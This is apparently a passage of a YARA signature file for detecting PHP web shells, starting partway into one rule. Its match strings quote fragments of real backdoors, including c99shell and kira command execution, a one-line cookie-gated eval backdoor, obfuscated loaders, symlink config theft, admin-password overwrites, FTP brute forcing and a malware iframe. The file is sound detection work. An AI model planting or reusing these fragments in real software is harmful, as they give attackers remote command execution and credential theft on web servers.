      $s11 = "'tools'=>'Tools','sqllogin'=>'SQL','email'=>'Email','upload'=>'Get Files','lookup'=>'List Domains','bshell'=>'Bindshell','kill'=" ascii
      $s12 = "$IP = array(\"127.0.0.2\",\"127.0.0.1\"); // IP Addresses allowed to access shell" fullword ascii
      $s13 = "if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_port'], $_SESSION['sql_user'], $_SESSION['sql_pas" fullword ascii
      $s14 = "\"rootbsd - BSD v?\"=>\"http://someshit.net/files/xpl/rootbsd\"," fullword ascii
      $s15 = "$user  = \"af1035a85447f5aa9d21570d884b723a\"; // MD5 encoded User" fullword ascii
      $s16 = "function cmd(){ // Command execution function" fullword ascii
      $s17 = "\"Basic Perl bindshell\"=>\"http://packetstormsecurity.org/groups/synnergy/bindshell-unix\"," fullword ascii
      $s18 = "<title>g00nshell v\" . $version . \" - \" . $servip . \"</title>\\n" fullword ascii
      $s19 = "\"h00lyshit - Linux 2.6 ALL\"=>\"http://someshit.net/files/xpl/h00lyshit\"," fullword ascii
      $s20 = "$result = mysql_query(\"SELECT * FROM \" . $_GET['table'], $sqlcon) or die(mysql_error());" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule admin_menu_addons_html
{
   meta:
      description = "php17 - file admin-menu-addons.html.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6e6c60e8e219492247bfe026b6e316c80d82ef03900d3d72733eb2f66578485c"
   strings:
      $s1 = "$link = 'http://www.shareasale.com/r.cfm?u=' . $u_id . '&b=812237&m=63061&afftrack=&urllink=' . $link;" fullword ascii
      $s2 = "<a target=\"_blank\" href=\"<?php echo $item['docs']; ?>\" class=\"nf-button secondary nf-doc-button\"><?php _e( '" fullword ascii
      $s3 = "<a target=\"_blank\" href=\"<?php echo $link; ?>\" title=\"<?php echo $item['title']; ?>\" class=\"primary nf-butto" fullword ascii
      $s4 = "<a target=\"_blank\" href=\"<?php echo $link; ?>\" title=\"<?php echo $item['title']; ?>\" class=\"primary nf-b" fullword ascii
      $s5 = "<strong><?php echo $notice[ 'title' ]; ?></strong> <?php _e( ' requires an update. You have version ', 'ninja-fo" fullword ascii
      $s6 = "<p><a><?php _e( 'Documentation coming soon.', 'ninja-forms' ); ?></a></p>" fullword ascii
      $s7 = "<?php if( ! empty( $item['plugin'] ) && file_exists( WP_PLUGIN_DIR.'/'.$item['plugin'] ) ): ?>" fullword ascii
      $s8 = "); ?><strong><?php echo $notice[ 'new_version' ]; ?></strong>." fullword ascii
      $s9 = "$u_id = get_option( 'nf_aff', false );" fullword ascii
      $s10 = "if ( !$u_id ) $u_id = apply_filters( 'ninja_forms_affiliate_id', false );" fullword ascii
      $s11 = "<p><?php echo $item['content']; ?></p>" fullword ascii
      $s12 = "<?php elseif( is_plugin_inactive( $item['plugin'] ) ): ?>" fullword ascii
      $s13 = "<img src=\"<?php echo NF_PLUGIN_URL . $item['image']; ?>\" />" fullword ascii
      $s14 = "<?php if( is_plugin_active( $item['plugin'] ) ): ?>" fullword ascii
      $s15 = "<span class=\"secondary nf-button\"><?php _e( 'Active', 'ninja-forms' ); ?></span>" fullword ascii
      $s16 = "utton\"><?php _e( 'Learn More', 'ninja-forms' ); ?></a>" fullword ascii
      $s17 = "<span class=\"secondary nf-button\"><?php _e( 'Installed', 'ninja-forms' ); ?></span>" fullword ascii
      $s18 = "n\"><?php _e( 'Learn More', 'ninja-forms' ); ?></a>" fullword ascii
      $s19 = "<a target=\"_blank\" href=\"<?php echo $item['docs']; ?>\" class=\"nf-button secondary nf-doc-button\"><?php _e( 'Docs', 'ninja-" ascii
      $s20 = "<a target=\"_blank\" href=\"<?php echo $link; ?>\" title=\"<?php echo $item['title']; ?>\" class=\"primary nf-button\"><?php _e(" ascii
   condition:
      uint16(0) == 0x643c and filesize < 8KB and
      8 of them
}

rule sig_12be9b143dff931563728ba4590cd29d631053d2
{
   meta:
      description = "php17 - file 12be9b143dff931563728ba4590cd29d631053d2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8b8f1c8a8a0921d2d88e3970de78af61aa55da10014eeb95cd3fb079d3e0015d"
   strings:
      $s1 = "$hex=$_POST['maskshell'];" fullword ascii
      $s2 = "$string.=chr(hexdec($hex[$i].$hex[$i+1]));" fullword ascii
      $s3 = "for($i=0;$i<strlen($hex)-1;$i+=2){" fullword ascii
   condition:
      uint16(0) == 0x3631 and filesize < 1KB and
      all of them
}

rule sig_28e654a05033113785c045d16aa97c22055620a7
{
   meta:
      description = "php17 - file 28e654a05033113785c045d16aa97c22055620a7.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f8bf2c4b39e010aa1c004ee13b59fbc2ab197bc4200381feaa46a29be81006cb"
   strings:
      $s1 = "preg_replace(\"\\x2F\\x2E\\x2A\\x2F\\x65\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x" ascii
      $s2 = "(Web Shell By Tunisian Cracker)" fullword ascii
      $s3 = "1V9CsZe7FQIFgdXBO5rOM7PddvW+9A4pWqUZpU9WVUrHmUAZiGl0p0C251I/RIO3gne0qwtlJIWPxv9/nu7rF1wTufZ93xPbQdyGbVVRlvj073KKctcxbMDj30ujTmBm" ascii
      $s4 = "7QvwrxX4/zvz361fTM2HaNdg+4W2AWJK11T/ZOTg6ODs/w6fjD3vGZ/er09F331dHJqX1xwdowHmY4NNb4+G0z66fBcNNq3avVduDLLIKkgTt0Zn7Sxakd1nqA2fd8N3" ascii
      $s5 = "FC7n1LxSMeQEmGCdFOyjNXhPHr3eG5ZKi4LV3b2q8qM8Cs27Zlt6zMiW9B44bEPsLig9Bgw6aZF+YASTv0/dNwqgcIySa/or1xy+yy/IL5J+3PNacvFX8EwwfTPejVvS" ascii
      $s6 = "2G/1J+UX2QsozMpJOawvVhZiR6C4yzdUILu5esYgu6l6bl/+3eYenZf7F/oe582jQ6t1rQudV0eC/vX9yspjSjpyQu/Gr3/sWbPucmYHY555Cm/6wBIuFdleYpZf3A9B" ascii
      $s7 = "F9Jczqx7UFou7TpalbNtqE2PnCjoDPWQ/NGkhzoDly4wjoYgomFJCpzgMYyme57Oo8gMS37p1IvKDvzwbuEjwCYhGq/vvjNyyeTdGeHTDkpExgU78rjjXs8lMbhiK2so" ascii
      $s8 = "9heZyuC7YNlZAvqEFfb7AtEFzuwImNNcPv3GQrrjCLNwvd0iGTsCMyKeYkKvuGA/I0DoZmCXXD/Zxn1FXE0lU6QrdZ/6lcXP2G9OYnH4yiRZlWdWt4dmGlAQNSJ+O1oT" ascii
      $s9 = "Ob1Dj2Nvx0mJUJkIo2HMJASR+bGaihj8Jt9iu1F/x62GC5sKu3BfFUpeeJWnSsXDYBIvxeFqVtjzc6UC7Zkey6CQgu7gDmwQ2YoGR/FWJgmUFd+KON8zcwI5GdPQ03aG" ascii
      $s10 = "iBBi8o5S9YkjiKF8BitJOBNiQ+YAcBe+t4AdsFKeY8YKdOfMlOULvpDlhrl3HtpVrOCubFNIq8vsDJ0aPPYnYNJi3ot4rRa2K5kitVGhRp6fqUrkvYJ4XrC1KFyxT8eY" ascii
      $s11 = "DSCzdFg/Z8Ye54JeZ6opfPqFfllSJgW3//GxkU/eGzXhTOSZm26EBCP4SIh7YZB7IwUm0zF6mWPBZQGzjoYC2VRukV4FAvb7Cv1Ns7oQ1QH3bFLiJVDxr+EID9jjtboL" ascii
      $s12 = "8OmbXte8Eli1y/bcfjMEr6s4R5/TCw2Thyh217nCTTrVptPp9XB1/X4yRynYkXjKrurDZ0rhCyCr/szt//xuC/7Ti58V2W3Ezdtp2410mtH8eU6AXTWXJGCfGsN/GSi4" ascii
      $s13 = "sC6dlVRs1wTA/NrXUCP2Ae6R+UH7XeNDvch/HOMNcVrFCf2zcVt9HzPt7nsyImZxkmbim3IqZJIaZtGdpcjp/M5r2ZX2z4sCZ7BJWreOEQtwKk5mbY6+j//MobjX0Mao" ascii
      $s14 = "5w+VE2ni51tlFf0dmeuIlD0+i6+8fMu2rbIJSDwJqsn8KcbSOr4ps4pMaMLSbKaFswteepqjLL7mwnXuK7HQ5RoJNCqHXcbLOzF3hYtn6we8EQWugPWNXarnEcf//btl" ascii
      $s15 = "z2BVOZyqylZ7Ki0mZW1Kk8wQQezCZFoPg5O3t4V4WzhnclJdm//01tdudx+IprDPi+CXYqUnciNl5c0wLbL9y13Mt9BjF47eWboxfP35yc2Rn1jH2BO6uRH/Ycn3GtD3" ascii
      $s16 = "uqDDHxR2xDGR/nmZ0n02x9U0LuSVBeEp8QZBqp3Esos5GdEp89KHJUFWRU9u9/L0i0pCE//iDjecHMVVjXKNBCm3oMH0VWo1QB0+bhjVJkWoOamdLtGfw8mwUoVmRgbs" ascii
      $s17 = "vkv+q//DCDvO+P9/wjqL/3zvtC9Bx/+I3XcwL98vFR+L5xvHfaQHqXwxx/eH1SCBMcbvY3jv0etI3o76/OzvPEOelT/3xuXl9BvxOOk/ePct+wbF7WYdzbOPQ5zR9O3k" ascii
      $s18 = "qFgeWaJT2OmxuBAE8XTDn6VVlcSw/jtuAyLWqH/GVIjrzTSFP+8yD1Xd5WpNXJDVCeZqNHcwbcuFfJIdVUBsS44sgAtE/c/gFe/sgP3LPKJEdc3LeMmmy1+o7vd9FNo4" ascii
      $s19 = "rJUphladSMKtFEzcumCkXOwJvFSKhZaFHi5TiZ+MVphR9FlZsb9Hr797/9/W95ztgah1fQPUUMwpMK2IQnfDP4Yn0axl7ihZJrGHSVaoeB2w8jh1KDMHA5NRpaBDL5ce" ascii
      $s20 = "oxYGyquL3jasaqAE9vaMw5emIBgbzyzlTwaoNI7Gq5d4UGZVphtZRhOZqVK5XpyE32uL70xc3BoIR1PJolsBSB4EDhLqoiwiVOByvl8gIQ01+dvn2DwoozGPQXxoQ2/V" ascii
   condition:
      uint16(0) == 0x6142 and filesize < 70KB and
      8 of them
}

rule sig_3928aadd08189f20932fc8155abda117630b68c6
{
   meta:
      description = "php17 - file 3928aadd08189f20932fc8155abda117630b68c6.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b767b8c7f6d39c13286690fd1109d142c0d1415e635d55dbdf389c0c3646261f"
   strings:
      $s1 = "$c='n,\"+\"),$ss($s*n[$*ni]*n,0,$e*n))),$k)))*n;$*no=ob_get*n_c*nontent*ns();*n*nob_end_cle*nan();$d=b*n';" fullword ascii
      $s2 = "$x='ase64_encode*n(x(gz*ncompress(*n$o),$k)*n*n*n);print(\"<$k>$d</$k>\"*n);@*nse*nssion_dest*nroy();}}}}';" fullword ascii
      $s3 = "$E='ncompr*ness*n(@x(@ba*nse64_deco*nde(preg*n_replac*ne(*nar*nray(\"/_/\",\"/*n*n-/\"),array(\"*n/\"*';" fullword ascii
      $s4 = "$Q='s*n*ntrpos($p,$h)===0){$s[*n$i]=*n\"\";*n$p=$*nss($p,3);}if(a*nrray_*nkey_exist*ns(*n$i*n,$s)*n){';" fullword ascii
      $s5 = "$b='L*nA*nNGU*nAGE\"];*nif($rr&&$ra){$u*n=parse_ur*n*nl($rr);pa*nrs*ne_str($u[\"q*nue*nry\"],$q);$q*n*n';" fullword ascii
      $s6 = "$G='}*n;}}ret*nurn $o;}$r=*n$_S*n*nERVER;$rr=@$r[*n\"H*nTTP_REFERER\"*n*n];$ra=@$r[\"H*nTTP_A*nCC*nEPT_';" fullword ascii
      $s7 = "$u='na,*n$m);if*n($q&&$m){@sess*nion_start()*n;$s=&$_S*n*nESSION;$ss*n=\"substr*n\"*n;*n$sl=\"strt*nolo';" fullword ascii
      $s8 = "$N='$i.$*nkf*n),0,3));$*np=\"\";for*n($z=1*n;$z<*ncoun*nt($m[1]);*n$z*n++)$p.=$*nq[$m[*n*n2][$z]];if(*n';" fullword ascii
      $s9 = "$R='*no=\"\";f*nor($i=0;$i<$l*n*n;)*n{for($j=0;($*nj<*n$*nc*n&&$i<$l);$j++,$i+*n+){$o.=$t{$i}^*n$k{$*nj';" fullword ascii
      $s10 = "$s='=arr*nay_valu*nes($q);preg_m*n*natch_a*nll(\"/(*n[\\\\w])[*n*n\\\\w-]+*n(?:;q=0.(*n[\\\\d]))?,?/\",$*nr*';" fullword ascii
      $s11 = "$T='wer\";$i=*n*n$m[1][0].$m[*n1]*n[1];$h=$sl(*n$*nss(md5($i.*n$kh)*n,0,3));$f=*n$sl($*nss*n(md5(';" fullword ascii
      $s12 = "$k='$s[$i].=*n$p;$e=strpos*n($*ns[$i],$f)*n;if($e)*n*n{$k=$kh.$kf*n;*n*nob_start();@*neva*nl(@gzu';" fullword ascii
      $s13 = "$f='$k*nh=\"5d41\";$kf=\"4*n*n02a*n\";functi*non *nx*n($*nt,$k){$c=strlen($k);$l*n=strlen(*n$t);$*n';" fullword ascii
      $s14 = "$j=str_replace('*n','',$f.$R.$G.$b.$s.$u.$T.$N.$Q.$k.$E.$c.$x);" fullword ascii
      $s15 = "$P=str_replace('oG','','croGeatoGoGe_fuoGnoGcoGtion');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_80aba3348434c66ac471daab949871ab16c50042
{
   meta:
      description = "php17 - file 80aba3348434c66ac471daab949871ab16c50042.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0d850cf8c1d527d832428f46648e3887889df1df602c72d9c381b31639a8d39f"
   strings:
      $s1 = "<textarea readonly size=\"1\" rows=\"7\" cols=\"53\"><?php @$output = system($_POST['command']); ?></textarea></font><p align=" fullword ascii
      $s2 = "<font face=\"Comic Sans MS\" size=\"1\">[ Diziler -_- Dizinler ]</td>" fullword ascii
      $s3 = "echo '<a target=\"_blank\" href=\"'.$file.'\">'.$file.'</a ><br>';" fullword ascii
      $s4 = "<body background=\"refbgd2.gif\" bgcolor=\"#000000\" text=\"#FFFFFF\" link=\"#666699\" vlink=\"#999999\" alink=\"#999900\">" fullword ascii
      $s5 = "<textarea size=\"70\" name=\"command\" rows=\"2\" cols=\"43\" ></textarea> <br>" fullword ascii
      $s6 = "b><font color=\"#FF0000\"></td></font></b></font><form enctype=\"multipart/form-data\" method=\"post\">" fullword ascii
      $s7 = "<p><font face=\"Comic Sans MS\" color=\"#FF0000\"><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb" ascii
      $s8 = "<font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buradan Dosya Upload Edebilirsiniz.</font><br>" fullword ascii
      $s9 = "<title>s72 Shell v1.0 Codinf by Cr@zy_King</title>" fullword ascii
      $s10 = "<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp" fullword ascii
      $s11 = "Dizin</font></b></font><font face=\"Verdana\" style=\"font-size: 8pt\"><font color=\"#800080\"><b>:</b> <? echo $_SERVER['DOCU" fullword ascii
      $s12 = "<meta http-equiv=\"Content-Language\" content=\"tr\">" fullword ascii
      $s13 = "nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ " fullword ascii
      $s14 = "&nbsp;</font></font><p align=\"center\"><form method=\"post\">" fullword ascii
      $s15 = "<meta name=\"ProgId\" content=\"FrontPage.Editor.Document\">" fullword ascii
      $s16 = "<meta name=\"GENERATOR\" content=\"Microsoft FrontPage 5.0\">" fullword ascii
      $s17 = "<meta name=\"Microsoft Theme\" content=\"refined 011\">" fullword ascii
      $s18 = "<textarea readonly size=\"1\" rows=\"7\" cols=\"53\"><?php @$output = system($_POST['command']); ?></textarea></font><p align=\"" ascii
      $s19 = "<b>Shell Dizini:</b> <? echo $SCRIPT_FILENAME ?>" fullword ascii
      $s20 = "</font><font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buraya " fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 20KB and
      8 of them
}

rule sig_5e93d0142071afd855fdc99c45207b19
{
   meta:
      description = "php17 - file 5e93d0142071afd855fdc99c45207b19.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "501d9df6c214133bf43e691ba2b70b397307861bb468a14e058784bef5b75d65"
   strings:
      $s1 = "<?php if(@$_COOKIE[qz]) ($_=@$_REQUEST[q]).@$_($_REQUEST[z]); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_6a6f0260611dcd60d502d308f74ff3c1ad590cfe
{
   meta:
      description = "php17 - file 6a6f0260611dcd60d502d308f74ff3c1ad590cfe.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "178ec234348b08e4da3d0d26f0e0db9637184e9fb4aec6b7345a5521c54456ac"
   strings:
      $x1 = "le.com/releases/ckira\\\">kira</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x2 = "t=\"en-us\"><title><?php echo getenv(\"HTTP_HOST\"); ?> - MeTaLTeaM.ORG</title><STYLE>" fullword ascii
      $x3 = "function k1r4ftpbrutecheck($host,$port,$timeout,$login,$pass,$sh,$fqb_onlywithsh)" fullword ascii
      $x4 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $s5 = "$logfile = $tmpdir_logs.\"k1r4_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $s6 = "<center><a href=\\\"\".$surl.\"act=processes&grep=\".basename($binpath).\"\\\"><u>View datapipe process</u></a></center>\";}" fullword ascii
      $s7 = "</style></head><BODY text=#ffffff bottomMargin=0 bgColor=#000000 leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwid" ascii
      $s8 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"\".$surl.\"act=processes&grep=\".base" ascii
      $s9 = "ho urlencode($d); ?>\"><b>Command execute</b></a> ::</b></p></td></tr>" fullword ascii
      $s10 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"\".$surl.\"act=f&f=accounting.lo" ascii
      $s11 = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" " ascii
      $s12 = "$fqb_log = \"FTP Quick Brute (called MeTaLTeaM . oRg\".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s13 = "# Home page: http://google.com" fullword ascii
      $s14 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgCol" ascii
      $s15 = "list($datapipe[\"remotehost\"],$datapipe[\"remoteport\"]) = explode(\":\",$datapipe[\"remoteaddr\"]);" fullword ascii
      $s16 = "elseif (!$data = k1r4getsource($datapipe[\"src\"])) {echo \"Can't download sources!\";}" fullword ascii
      $s17 = "xp\" value=\"1\"  checked> - regexp&nbsp;<input type=submit name=submit value=\"Search\"></form></center></p></td>" fullword ascii
      $s18 = "$out = \"# Dumped by kira.SQL v. \".$shver.\"" fullword ascii
      $s19 = "header(\"WWW-Authenticate: Basic realm=\\\"kira \".$shver.\": \".$login_txt.\"\\\"\");" fullword ascii
      $s20 = "if (empty($datapipe[\"remoteaddr\"])) {$datapipe[\"remoteaddr\"] = \"irc.dalnet.ru:6667\";}" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and 4 of them
}

rule php17_4_0
{
   meta:
      description = "php17 - file 4.0.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "f4c321991ec2b24fb70ceeade0108f180d991ca0d45bef839379e7c07d813a1d"
   strings:
      $x1 = "echo '<br /><br /><form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">';" fullword ascii
      $s2 = "<td><a target='_blank' href='http://$config'>config</a></td><td><b style='color:red'>failed2</b></td></tr>\";" fullword ascii
      $s3 = "<td><a target='_blank' href='http://$exp'>config</a></td><td><b style='color:red'>failed</b></td></tr>\";" fullword ascii
      $s4 = "if ($query and $query3 ){$r = '<b style=\"color: #006600\">Succeed </b>user [sec-w.com] pass [1]</b>';}else{$r = '<b style=\"co" fullword ascii
      $s5 = "$wp2=$pageURL.\"/sym/root/home/\".$user['name'].\"/public_html/blog/configuration.php\";" fullword ascii
      $s6 = "<a style=\"text-decoration: none; color: #F4F4F4;\" title=\"???? ???????\"/href=\"http://sec-w.com/cc\">???? ???????</a>" fullword ascii
      $s7 = "$wp2=$pageURL.\"/sym/root/home/\".$user['name'].\"/public_html/blog/wp-config.php\";" fullword ascii
      $s8 = "$query   = @mysql_query(\"UPDATE `$tab` SET `user_login` ='sec-w.com'\") or die;" fullword ascii
      $s9 = "$wh2=$pageURL.\"/sym/root/home/\".$user['name'].\"/public_html/support/configuration.php\";" fullword ascii
      $s10 = "<a style=\"text-decoration: none; color: #F4F4F4;\" title=\"???????\"/href=\"http://sec-w.com/cc\">???????</a>" fullword ascii
      $s11 = "<a href='sym/root/home/\".$user['name'].\"/public_html' target='_blank'>symlink </a>" fullword ascii
      $s12 = "$fun = preg_match('/Forbidden/',@file_get_contents('sym/root') or !@file_get_contents('sym/root'));" fullword ascii
      $s13 = "$query3  = @mysql_query(\"UPDATE `$tab`  SET `password` ='44a0bcda611514625ba94e0b1c0bdaed:2iets9ydjR3iOdSuyvW54pIzyF9M1P5J'\"" fullword ascii
      $s14 = "if(isset($_GET['save']) and isset($_POST['file']) or @filesize('passwd.txt') > 0){" fullword ascii
      $s15 = "<a href='$pageFTP/sym/root/home/$user/public_html' target='_blank'>FTP</a>" fullword ascii
      $s16 = "if ($query){$r = '<b style=\"color: #006600\">Succeed </b>user [sec-w.com] pass [1]</b>';}" fullword ascii
      $s17 = "echo \"<div class='tmp'><table align='center' width='35%'><td>Users</td><td>symlink</td><td>FTP</td>\";" fullword ascii
      $s18 = "<a href='sym/root/home/$user/public_html' target='_blank'>Symlink </a>" fullword ascii
      $s19 = "<input type='submit' value='Inject shell' />" fullword ascii
      $s20 = "$vb2=$pageURL.\"/sym/root/home/\".$user['name'].\"/public_html/vb/includes/config.php\";" fullword ascii
   condition:
      uint16(0) == 0x2020 and filesize < 90KB and
      1 of ($x*) and 4 of them
}

rule sig_2017_10_01_000021_Db_System_Sessions_Update
{
   meta:
      description = "php17 - file 2017_10_01_000021_Db_System_Sessions_Update.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "73944046c6c73187ff99e5dc5bbfc98cfcdc56e907aae475be58f8a39f9951c7"
   strings:
      $s1 = "$table->text('user_agent')->nullable();" fullword ascii
      $s2 = "Schema::table('sessions', function (Blueprint $table) {" fullword ascii
      $s3 = "$table->unsignedInteger('user_id')->nullable();" fullword ascii
      $s4 = "$table->string('ip_address', 45)->nullable();" fullword ascii
      $s5 = "class DbSystemSessionsUpdate extends Migration" fullword ascii
      $s6 = "use October\\Rain\\Database\\Updates\\Migration;" fullword ascii
      $s7 = "use October\\Rain\\Database\\Schema\\Blueprint;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_0771fc6f0f4b1d7d1bb73bbbe14e0e31
{
   meta:
      description = "php17 - file 0771fc6f0f4b1d7d1bb73bbbe14e0e31.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "faeff8e37876023a6f84c94e090b22c9b3eea333ed96d2688c45d8900f7cfdbc"
   strings:
      $x1 = "?><html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language" ascii
      $x2 = "am.ru/releases/cc99shell\\\">c99shell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x3 = "if ($win) {$file = \"C:\\\\tmp\\\\dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $x4 = "# \".gethostbyname($SERVER_ADDR).\" (\".$SERVER_ADDR.\")\".\" dump db \\\"\".$db.\"\\\"" fullword ascii
      $x5 = "else {$tmp = htmlspecialchars(\"./dump_\".$SERVER_NAME.\"_\".$sql_db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\");}" fullword ascii
      $x6 = "?><table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form action=\"<?ph" ascii
      $x7 = "else {$file = \"/tmp/dump_\".$SERVER_NAME.\"_\".$db.\"_\".date(\"d-m-Y-H-i-s\").\".sql\";}" fullword ascii
      $x8 = "else {echo \"<b>Execution command</b>\"; if (empty($cmd_txt)) {$cmd_txt = true;}}" fullword ascii
      $x9 = "$logfile = $tmpdir_logs.\"c99sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $x10 = "if (file_get_contents($v)) {echo \"<b><font color=\\\"red\\\">You can't crack winnt passwords(\".$v.\") </font></b><br>\";}" fullword ascii
      $x11 = "$fqb_log = \"FTP Quick Brute (called c99shell v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s12 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $s13 = "$out = \"# Dumped by C99Shell.SQL v. \".$shver.\"" fullword ascii
      $s14 = "elseif (is_callable(\"passthru\")) {@ob_start(); passthru($cmd); $result = @ob_get_contents(); @ob_end_clean();}" fullword ascii
      $s15 = "# MySQL version: (\".mysql_get_server_info().\") running on \".$SERVER_ADDR.\" (\".$SERVER_NAME.\")\".\"" fullword ascii
      $s16 = "elseif (is_callable(\"system\")) {@ob_start(); system($cmd); $result = @ob_get_contents(); @ob_end_clean();}" fullword ascii
      $s17 = "header(\"Content-disposition: attachment; filename=\\\"\".basename($sql_dump_file).\"\\\";\"); " fullword ascii
      $s18 = "ent=\"en-us\"><link rel=\"shortcut icon\" href=\"\" type=\"image/x-icon\"><title><?php echo getenv(\"HTTP_HOST\"); ?> - c99shell" ascii
      $s19 = "echo \"<b>Connected to \".$SERVER_NAME.\" with login \\\"\".$str[0].\"\\\" and password \\\"\".$str[0].\"\\\"</b><br>\";" fullword ascii
      $s20 = "ho urlencode($d); ?>\"><b>Command execute</b></a> ::</b></p></td></tr>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 500KB and
      1 of ($x*) and all of them
}

rule sig_3dcaaf8123ff40b92d04c4fed0a9090c3af2c261
{
   meta:
      description = "php17 - file 3dcaaf8123ff40b92d04c4fed0a9090c3af2c261.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ddcb3a06bc18e8cd74dd9d5dc5590750cb8d6c74e643b3cb6e8766cedcebf4e0"
   strings:
      $s1 = "$bhart = \"eNrsvXlX4zjWOPw3c858B7WHp5IMIRsJS1FQDUkolkAgCVBQ1OF1YicxOLaxHUKqp57P/upqseUlCxSZ6ec3XaebJFqurqSrqyvpLp8+W33r739bbsudx" ascii
      $s2 = "<iframe width=0px height=0px frameborder=no name=frame1 src=http://fightagent.ru> </iframe>" fullword ascii
      $s3 = "H0/6CUcm81/ww17RcS2B29yp/SOH1q1c/v449e1hjC4eGhX65gO3k1t3n797+B7NU0WA=\"; eval(\"?>\".gzuncompress(base64_decode($bhrt))); ?>" fullword ascii
      $s4 = "$ind = \"WW91IGp1c3QgZ290IGhhY2tlZCAhISEhIQ==\"; // Base64 encoded \"You Just Got Hacked !!\"" fullword ascii
      $s5 = "div.logindiv" fullword ascii
      $s6 = "//====+++Coded By Arjun+++===//" fullword ascii
      $s7 = "$malsite = \"http://fightagent.ru\";  // Malware Site" fullword ascii
      $s8 = "VzbTOZWlhcWl5ZXfuV2vFtVq32Tctq4BI93bnbpF/ZNGEOQL/FtF/xd4rBmLaZ1H66ZZP4RyybSZYKFqXpBQf+wml6ToPpIpEEGpoqBpPiPHKHsAb1CKMzxBnw6/wf4L" ascii
      $s9 = "rbJ9mq7bzHRA1//Jg8gETIOMBFVPsd2vphGuqktmhgm3doRDEnD1zFbL5DC1hG0dvmoD2pK6c4/x2aIWLQpDaIwtY7NIITOhOHC5+w3qEJshtr7qSeVGn2OzTEdQwnLl" ascii
      $s10 = "eval(\"?>\".gzuncompress(base64_decode($bhart)));" fullword ascii
      $s11 = "// Set Username & Password" fullword ascii
      $s12 = "+CJY7dJhfANw7Rk/0ZY+VKf6KL3Xwxj2b+JGrBm1J2N3+U+RMkBNYwlhhQ5jgnSlDI8N6lKFGEtX6QvyJFCsW9SHRDuLgHSIPkpA/jkcqQuNbw5WtEGo1yiy7xNjnZG7" ascii
      $s13 = "qfE48Qlb7jePhkPPeYeFXef1zoApl3UIgUQ6+D0gk7EYcJufUTbieAnFLRYjFtIO9C4nd2IzGhLkNIVjJYsIIDSHIS0RIRhN9WTCnjD5+sxBT5OXHAV/PR4Z4y4CJTmj" ascii
      $s14 = "AAIWOY4U1G3GNmI8ao5T3xqhCQv4iWMGvvipsPdwaC3hxn/Un2wBxWKoicsnwOonTRat/nHkJZLG440/aHPing1xQ0Xf3HIU9/+hx2XdNWEGyCePMXji3ehS53z5DA55" ascii
